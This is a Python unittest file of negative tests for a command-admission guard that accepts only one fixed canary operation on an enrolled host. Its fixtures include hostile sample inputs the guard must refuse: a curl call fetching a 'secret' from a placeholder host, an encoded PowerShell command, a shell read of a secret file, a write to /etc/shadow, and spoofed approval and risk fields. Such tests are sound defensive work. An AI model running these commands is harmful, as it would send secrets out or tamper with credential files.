"""Negative admission tests: parser never executes or classifies arbitrary shell.

The command request contains only four scalar fields. Any asserted safe/risk
status, shell/argv/path, exfil URL or additional field fails closed.
"""
from __future__ import annotations

import json
import unittest
import uuid

from preexec_admission import (
    ADMISSION_CONTRACT, FIXED_OPERATION, FIXED_WORKLOAD,
    AdmissionRefused, LocalCanaryAdmission, fixed_canary_proposal,
)


class PreExecutionAdmissionTests(unittest.TestCase):
    def setUp(self):
        self.guard = LocalCanaryAdmission(enrolled_host="synthetic-enrolled-host")

    def valid(self):
        return fixed_canary_proposal("synthetic-enrolled-host")

    def denied(self, request):
        with self.assertRaises(AdmissionRefused) as caught:
            self.guard.admit(request)
        self.assertEqual(caught.exception.reason, "COMMAND_NOT_ADMITTED")
        # The response must never echo sensitive caller-supplied command text.
        self.assertNotIn("secret", str(caught.exception))

    def test_fixed_workload_admitted_but_no_shell_or_token_in_record(self):
        result = self.guard.admit(self.valid())
        self.assertEqual(result.workload, FIXED_WORKLOAD)
        self.assertEqual(result.operation, FIXED_OPERATION)
        self.assertEqual(result.host, "synthetic-enrolled-host")
        self.assertEqual(result.safe_status()["admission"], "FIXED_CANARY_ONLY")
        self.assertNotIn("privilege", json.dumps(result.safe_status()).lower())

    def test_raw_shell_and_network_egress_not_in_registry(self):
        bad = self.valid()
        for key, value in (
            ("command", "curl https://example.invalid/secret"),
            ("shell", "powershell -EncodedCommand ZQB4AGYAaQBs"),
            ("argv", ["sh", "-c", "cat synthetic-secret"]),
            ("network_target", "example.invalid"),
            ("dns_destination", "synthetic-secret.example.invalid"),
            ("read_path", "C:\\users\\example\\secret.txt"),
            ("write_path", "/etc/shadow"),
            ("file_transfer", True),
            ("approval", "Eddie said yes"),
            ("risk", "safe"),
            ("risk_classification", "LOW"),
            ("environment", {"HOME": "/private"}),
            ("serialized_tool_args", "{}"),
        ):
            with self.subTest(key=key):
                proposed = dict(bad, **{key: value})
                self.denied(proposed)

    def test_wrong_host_and_missing_consent_payload_do_not_widen(self):
        for host in ("wrong-host", "synthetic-enrolled-host ", "", None, 12):
            with self.subTest(host=host):
                proposed = self.valid()
                proposed["host"] = host
                self.denied(proposed)
        self.denied(None)
        self.denied("owner approved")
        self.denied([])
        self.denied({"operation": FIXED_OPERATION})

    def test_action_spoofing_and_schema_drift_fail_closed(self):
        for operation in ("RUN_ARBITRARY_PROCESS", "RUN_DISPOSABLE_CHILD_CANARY ",
                          "run_disposable_child_canary", "RUN_DISPOSABLE_CHILD_CANARY\n",
                          "READ_SECRET", "PING_EXTERNAL_URL", None):
            with self.subTest(operation=operation):
                proposed = self.valid()
                proposed["operation"] = operation
                self.denied(proposed)
        proposed = self.valid()
        proposed["contract"] = "ldw.commander.canary-admission.v2"
        self.denied(proposed)

    def test_malformed_operation_ids_are_not_accepted(self):
        for uid in ("", "0"*36, "not-a-uuid", None, 22,
                    str(uuid.uuid4()).upper(), str(uuid.uuid4())+" "):
            with self.subTest(uid=uid):
                proposed = self.valid()
                proposed["operation_id"] = uid
                self.denied(proposed)

    def test_trusted_host_config_required(self):
        for host in (None, "", "a" * 129, False):
            with self.subTest(host=host):
                with self.assertRaises(ValueError):
                    LocalCanaryAdmission(enrolled_host=host)

    def test_caller_cannot_configure_operation_catalog_or_egress(self):
        with self.assertRaises(TypeError):
            LocalCanaryAdmission(enrolled_host="synthetic-enrolled-host",
                                 allow_shell=True)
        with self.assertRaises(TypeError):
            LocalCanaryAdmission(enrolled_host="synthetic-enrolled-host",
                                 network_egress="any")


if __name__ == "__main__":
    unittest.main()
